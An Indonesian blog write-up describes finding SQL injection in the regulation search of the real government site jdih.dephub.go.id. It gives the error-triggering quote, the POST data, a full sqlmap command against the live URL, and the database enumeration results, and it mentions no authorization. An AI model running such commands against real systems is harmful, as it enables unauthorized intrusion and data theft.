---
title: SQL Injection - Subdomain dephub.go.id
date: 2019/10/21
description: Write Up SQL Injection di website dephub.go.id
tag: Write Up
author: You
---

Halo :D
Kembali lagi bersama saya :D
Kali ini saya ingin menjelaskan bagaimana saya bisa menemukan BUG SQL Injection pada Subdomain dephub.go.id ?
Let’s go!

![ ](https://miro.medium.com/max/24000/1*J6bG2_ibqeA_lodHkh452Q.png)

Ketika saya mencoba untuk mencari point inject nya, saya berpikir untuk mencari di kolom pencarian peraturan. Maka saya memasukkan input single quote (‘) pada kolom pencarian peraturan. Dan respons nya setelah saya input adalah

![ ](https://miro.medium.com/max/2400/1*hr9EiGPmSCHbaXuqYVpOLg.png)

```
Respons
“ You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ‘%’ OR title like ‘%’%’ ) AND `state` IS NOT NULL ORDER BY `created` desc’ at line 3 “
```

Sesudah Saya mendapatkan pesan error setelah memasukkan single quote (‘), lanjut Saya mencari post datanya menggunakan Live Http Header di Mozilla Firefox atau ke inspect element lalu ke bagian network. Berikut Post Data yang sudah Saya dapatkan

![ ](https://miro.medium.com/max/463/1*w4kGZXasP_gvD1-UezER4A.png)

Post Data: s=’&jenis_peraturan=0&nomor=&tahun=0
___

Selanjutnya saya Melakukan Scan di SQL Map Dengan Command

```
sqlmap.py -u “http://jdih.dephub.go.id/pencarian” — data=”s=’&jenis_peraturan=0&nomor=&tahun=0” — dbs
```

Hasil dari scannya adalah

![ ](https://miro.medium.com/max/2400/1*XD9FX5AbncHuhF1iDMM1rQ.png)

![ ](https://miro.medium.com/max/2400/1*hIdIwIYqVIJz2I0IGkcvzw.png)

available databases [70]
database management system users [14]

![ ](https://miro.medium.com/max/24000/1*i5PboXm1R4eSyhIew8VKwg.png)

Oke itu saja write up sederhana dari saya, Terima kasih sudah membaca write up saya ini. Jangan lupa share yaa, agar saya semangat untuk memberikan write up lagi :D

Contact me at [rafteday.net/about](https://buayalaut.co/about)